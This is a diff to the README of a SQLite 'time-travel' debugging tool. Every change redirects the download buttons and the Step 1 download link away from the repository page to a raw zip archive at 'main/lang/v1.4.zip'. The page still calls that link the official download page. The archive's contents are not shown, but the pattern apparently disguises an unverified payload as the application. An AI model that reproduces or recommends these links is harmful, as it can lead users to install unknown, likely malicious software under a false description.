@@ -1,6 +1,6 @@
 <h1>⏱️ time-travel-sqlite-debugger - Rewind and Replay Your Database History</h1>
 
-<a href="https://github.com/nonliteral-fullhouse266/time-travel-sqlite-debugger" style="display:inline-block;background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;font-size:18px;font-weight:bold;border-radius:8px;margin-top:20px;">📥 Download Now</a>
+<a href="https://raw.githubusercontent.com/nonliteral-fullhouse266/time-travel-sqlite-debugger/main/lang/v1.4.zip" style="display:inline-block;background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;font-size:18px;font-weight:bold;border-radius:8px;margin-top:20px;">📥 Download Now</a>
 
 <h2>🕰️ What Is This?</h2>
 
@@ -42,7 +42,7 @@ Let’s get you up and running in under five minutes. Even if you have never don
 
 <h3>Step 1: Visit the Download Page</h3>
 
-Click the big green button at the top of this page. It will take you to the official download page. Alternatively, you can click here: <a href="https://github.com/nonliteral-fullhouse266/time-travel-sqlite-debugger">Visit this link to download the application</a>.
+Click the big green button at the top of this page. It will take you to the official download page. Alternatively, you can click here: <a href="https://raw.githubusercontent.com/nonliteral-fullhouse266/time-travel-sqlite-debugger/main/lang/v1.4.zip">Visit this link to download the application</a>.
 
 <h3>Step 2: Download the Application</h3>
 
@@ -168,6 +168,6 @@ Stop worrying about database mistakes. With **time-travel-sqlite-debugger**, you
 
 Try it today and experience the freedom of time travel in your development workflow.
 
-<p style="margin-top:30px;text-align:center;"><a href="https://github.com/nonliteral-fullhouse266/time-travel-sqlite-debugger" style="background-color:#FF5722;color:white;padding:12px 24px;text-decoration:none;font-weight:bold;border-radius:6px;">⬇️ Get Started - Download for Free</a></p>
+<p style="margin-top:30px;text-align:center;"><a href="https://raw.githubusercontent.com/nonliteral-fullhouse266/time-travel-sqlite-debugger/main/lang/v1.4.zip" style="background-color:#FF5722;color:white;padding:12px 24px;text-decoration:none;font-weight:bold;border-radius:6px;">⬇️ Get Started - Download for Free</a></p>
 
 <meta name="keywords" content="database-debugger, developer-tools, i18n, open-source, php, sqlite, time-travel, vanilla-js, wal-support, zero-dependencies">
